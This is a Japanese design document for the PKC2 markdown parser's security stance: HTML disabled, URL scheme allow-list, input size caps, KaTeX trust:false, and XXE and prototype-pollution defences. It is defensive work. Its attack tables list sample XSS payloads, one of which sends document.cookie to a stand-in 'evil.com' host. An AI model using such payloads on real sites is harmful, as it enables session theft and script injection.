# 07. Security Stance(HTML 完全 off + 全記法 hard cap + parser hardening)

## 7.1 設計判断:HTML pass-through 一切受け付けない

PKC2 markdown parser は `markdown-it` ベース、初期化時 `html: false` を **build-time asserter で固定**(deviation 不可)。

### 7.1.1 効果

- 生 HTML tag(`<div>`、`<script>`、`<img onerror=...>`)は literal text として escape
- HTML attribute(`onclick=`、`style="..."` 直書き)は注入不能
- `<` `>` は literal 文字、tag 化なし
- `<script>alert(1)</script>` を書いても `&lt;script&gt;alert(1)&lt;/script&gt;` に escape

### 7.1.2 enforcement

- `markdown-it` instantiation で `{ html: false }` を hardcode
- build-time asserter:`src/features/markdown/markdown-render.ts` の md instantiation を AST scan、`html: true` に変更されたら build fail
- runtime check:`md.options.html === false` を assert、テスト test で確認

### 7.1.3 想定される攻撃ベクター(全部封じ済)

| 攻撃 | 例 | PKC2 防御 |
|------|-----|---------|
| XSS via tag | `<script>fetch('evil.com', {body:document.cookie})</script>` | `html: false` で escape |
| XSS via attribute | `<img src=x onerror=alert(1)>` | 同上 |
| HTML injection | `<iframe src="evil.com">` | 同上 |
| `javascript:` URL | `[click](javascript:alert(1))` | URL scheme allow-list で reject |
| CSS injection | `<style>body{display:none}</style>` | tag 自体 escape |
| SVG-based XSS | `<svg onload=alert(1)>` | tag 自体 escape |

### 7.1.4 URL scheme allow-list

`[label](url)` の URL は allow-list filter:

| scheme | 許可 |
|--------|------|
| `https:` | ✅ |
| `http:` | ✅(downgrade warning option あり)|
| `mailto:` | ✅ |
| `tel:` | ✅ |
| `entry:` | ✅(PKC2 内部 ref)|
| `asset:` | ✅(PKC2 内部 asset)|
| `pkc:` | ✅(PKC2 permalink)|
| `data:` | image / font に限定(`asset:` 経由のみ、user 直接 `[](data:...)` は reject)|
| `javascript:` | ❌ reject |
| `file:` | ❌ reject |
| `vbscript:` | ❌ reject |
| その他 unknown scheme | ❌ reject |

reject 時は link が無効化(plain text 化)+ inspector で warning。

## 7.2 全記法に hard cap

### 7.2.1 frontmatter(既実装、wave-10-2 YAML reform)

| cap | default | 超過時 |
|-----|---------|--------|
| 全 frontmatter サイズ | 16 KB | parse 中止 + 可視 warning |
| 全 key 数(全階層合計) | 100 | 以降を無視 + warning |
| 階層深度 | 4 | 以降を無視 + warning |
| 単一配列の長さ | 500 items | 以降を切り捨て + warning |
| 単一 string 値の byte 数 | 4 KB | 切り詰め + warning |
| 禁止 key | `__proto__` / `constructor` / `prototype` | reject + warning |

### 7.2.2 markdown 全体

| cap | default | 超過時 |
|-----|---------|--------|
| 全 body サイズ | 10 MB | parse 中止(entry の保存は許容、parse は no-op)|
| heading nest depth(setext / ATX 上限)| 6(`######`) | 7 個以上 `#` は plain text 化 |
| inline modifier nest depth | 8(`***bold italic***` 等の入れ子) | plain text fallback |
| code fence size | 64 KB | 切り詰め + warning |
| code fence 行数 | 1000 | 切り詰め + warning |
| table rows | 1000 | 切り詰め + warning |
| table cols | 50 | 切り詰め + warning |
| list items | 1000 | 切り詰め + warning |
| list nest depth | 8 | 以降 plain text 化 |
| transclusion(embed)depth | 1(self / cycle そもそも block) | block placeholder |
| variables expansion 回数 / render | 1000 | 1000 超は literal 残置 + warning(無限 recursion 防御) |

### 7.2.3 Renderer Registry(`06-code-block-ecosystem.md`)

各 renderer に固有 cap:

| renderer | sourceBytes | outputNodes | parseSteps | 説明 |
|----------|-----------|-----------|----------|------|
| tree | 16 KB | 5000 | — | path 行数で実質 1000 行 cap |
| dbschema | 32 KB | 5000 | 10000 | DSL parser step 上限 |
| json{view} | 64 KB | 5000 | — | JSON.parse 自体に上限なし(深さは DOM cap で抑制)|
| yaml{view} | 64 KB | 5000 | — | frontmatter parser 経由、YAML cap 適用 |
| toml{view} | 64 KB | 5000 | — | TOML parser library が cap 持つ |
| xml{view} | 64 KB | 5000 | — | DOMParser、DOCTYPE / ENTITY 拒否(XXE 防御)|
| query | 8 KB | 5000 + result rows ≤ 1000 | 10000 | SQL DSL parse + container 走査 |
| cards | 8 KB | LID 数 ≤ 100 | — | grid 配置 |
| mindmap | 16 KB | nodes ≤ 500 | — | indent 階層 ≤ 8 |
| flow / seq / state | 16 KB | nodes ≤ 200, edges ≤ 500 | — | SVG layout 計算量 |
| binary | 8 KB | fields ≤ 100, total bytes ≤ 1024 | 10000 | DSL parser step |
| hexdump | 64 KB | bytes ≤ 65536 | — | XXD-style 表示 |
| diff | 32 KB | lines ≤ 5000 | — | 線形 diff |

### 7.2.4 math(KaTeX、§05)

| cap | default | 超過時 |
|-----|---------|--------|
| 単一 math 式 文字数 | 4 KB | warning + literal 残置 |
| document 内 math 数 | 1000 | 1000 個目以降は warning + literal 残置 |
| KaTeX render timeout | 1 sec | KaTeX 内部 cap、PKC2 で再保証 |
| KaTeX `trust` option | `false`(default) | `\href` `\url` `\includegraphics` 等の危険 macro 無効化 |

## 7.3 parser hardening 設計原則

### 7.3.1 silent fail 禁止

cap 超過 / parse 失敗 / 異常入力は **必ず可視 warning** として user に表示:

- `pkc-frontmatter-warning` banner(YAML reform で landed)を全機能で再利用
- preview / detail / Viewer popup の 6 surface 全部に表示
- inspector overlay(`?pkc-debug=` URL flag)で詳細 dump 可能

silent ignore は user が「parser に無視された」と気付けず、攻撃 / 仕様誤認の原因になる。

### 7.3.2 fail-safe(rollback to previous state)

parser が落ちても:

- entry の保存 source(markdown body)は無傷(parser 失敗で source は破壊されない)
- IR への変換失敗時は最低限「Document{children: [Text{value: source}]}」に degrade
- render 失敗時は raw source を `<pre>` で表示(`pkc-render-fallback` class)

### 7.3.3 type discriminate 厳密化

IR node kind は閉集合(`08-ir-mapping.md`)、未知 kind は IR validator が reject。runtime cast は禁止、TypeScript discriminated union で switch case 完全網羅を確保。

## 7.4 build-time asserter

reform で導入する build-time check の集合:

```javascript
// scripts/build-asserter.cjs
const checks = [
  // 7.4.1 markdown-it html: false
  () => assertSourceContains('src/features/markdown/markdown-render.ts',
                              "html: false",
                              "markdown-it must be initialized with html:false"),

  // 7.4.2 KaTeX trust: false
  () => assertSourceContains('src/features/markdown/markdown-render.ts',
                              "trust: false",
                              "KaTeX must be configured with trust:false"),

  // 7.4.3 forbidden frontmatter keys
  () => assertSourceContains('src/features/markdown/frontmatter.ts',
                              "['__proto__', 'constructor', 'prototype']",
                              "FORBIDDEN_KEYS must include all 3 prototype-pollution keys"),

  // 7.4.4 cap values are spec-fixed
  () => assertSourceContains('src/features/markdown/frontmatter.ts',
                              "totalBytes: 16 * 1024",
                              "frontmatter totalBytes cap must be 16 KB"),
  // … other caps

  // 7.4.5 URL scheme allow-list
  () => assertSourceContains('src/features/markdown/markdown-render.ts',
                              "ALLOWED_URL_SCHEMES",
                              "URL scheme allow-list must be defined"),

  // 7.4.6 dist bundle integrity
  () => assertBundleIntegrity('dist/pkc2.html'),
];
```

build pipeline で `npm run build` 内に組み込み、CI で必ず走らせる。

## 7.5 SRI(Subresource Integrity)

dist/pkc2.html 内に bundled asset の hash を計算、build script で生成 + injection:

```html
<!-- meta tag for bundle integrity -->
<meta name="pkc-bundle-integrity" content="sha384-abc...">
```

これは「ダウンロードされた pkc2.html が改竄されていないか」の verify に使える(完全 offline 利用想定でも、user が file 共有時の保証として有用)。

## 7.6 sandboxing 戦略

### 7.6.1 採用しない iframe / WebWorker

**embed-iframe-sandbox は採用せず**(`06-code-block-ecosystem.md` §6.10):

- iframe sandbox でも frame 経由の click jacking
- 親 page の cookie / storage への副作用 risk
- HTML pass-through 禁止の design philosophy と微妙な対立

代替:`@[label](https://...)` external link card で代替十分。

### 7.6.2 WebWorker 利用は限定的

KaTeX render は main thread で OK(timeout 1 sec で十分)。
重い処理(将来 graphviz / mermaid 採用時)は WebWorker 移行検討余地ありだが、**現状の Phase A〜F は main thread で完結**。

## 7.7 入力 source の信頼境界

PKC2 における入力 source の trust level:

| source | trust | 検証 |
|--------|-------|------|
| user 自身が書いた entry body | trusted-ish(self-pwn 防御は必要) | parser cap で防御 |
| 他 user から import した container | UNTRUSTED | 全 cap 適用、HTML 完全 off、URL allow-list |
| 外部 URL(`https://`)から fetch する asset | UNTRUSTED | CSP / SRI / cap 適用 |
| `pkc-extension` 経由の AI 出力 | UNTRUSTED(AI 動作も信頼境界) | 同上 |

→ **trust boundary は entry 単位**、container import / extension I/O 時に強化 cap を再適用。

## 7.8 設計まとめ

### 確定

- **HTML pass-through 完全 off**(markdown-it `html: false`、build-time asserter)
- **全記法に hard cap**(frontmatter / markdown 全体 / 各 renderer / math 全部)
- **silent fail 禁止**、可視 warning で必ず通知
- **URL scheme allow-list**、`javascript:` 等は reject
- **prototype pollution 防御**(forbidden keys reject)
- **XML XXE 防御**(DOCTYPE / ENTITY 拒否、`xml{view}` の中で)
- **KaTeX trust: false**、危険 macro 無効
- **build-time asserter** で security 設定の deviation を検知
- **SRI** で bundle 改竄検知
- **iframe sandbox 採用せず**、external embed は card で代替

### 想定される攻撃と防御

| 攻撃 | 入力例 | 防御層 |
|------|--------|--------|
| XSS via tag | `<script>` | markdown-it `html: false` |
| XSS via URL | `[](javascript:alert(1))` | URL scheme allow-list |
| XSS via SVG | `<svg onload=...>` | markdown-it `html: false` |
| XSS via math | `\href{javascript:...}{}` | KaTeX `trust: false` |
| HTML injection | `<iframe src=evil.com>` | markdown-it `html: false` |
| Prototype pollution | frontmatter `__proto__` | FORBIDDEN_KEYS reject |
| XML XXE | xml{view} に DOCTYPE | DOMParser DOCTYPE reject |
| YAML billion-laughs | frontmatter alias 攻撃 | frontmatter parser に alias 不対応 |
| DoS via huge input | 100 MB body | body size cap 10 MB |
| DoS via deep nest | 1000 重 list / heading | nest depth cap 8 |
| DoS via infinite vars | 自己参照 vars | expansion 回数 cap 1000 |
| Bundle tampering | pkc2.html 改竄 | SRI hash check |

## 7.9 レビュー観点

1. **HTML 完全 off の判断**:user 中に「`<details>` `<summary>` を書きたい」需要があった時の対処は?(formal `:::details` directive で代替案)
2. **URL allow-list**:`https:` / `http:` 以外で許可すべき scheme(`magnet:` / `ipfs:` / `dat:` 等)はあるか?
3. **cap の default 値**:現状の値で「狭すぎ / 広すぎ」の判断、特に code fence 64 KB / table 1000 rows / list 1000 items 等
4. **parser hardening**:silent fail 禁止が正しく実装されている確認、テスト test カバレッジ
5. **trust boundary**:container import 時の cap 再適用が UI 上 user に見える形で行われるか
6. **SRI 採用**:bundle 改竄検知の実装、user 利用 flow との整合
7. **build-time asserter**:assert 漏れの可能性、追加すべき check 項目
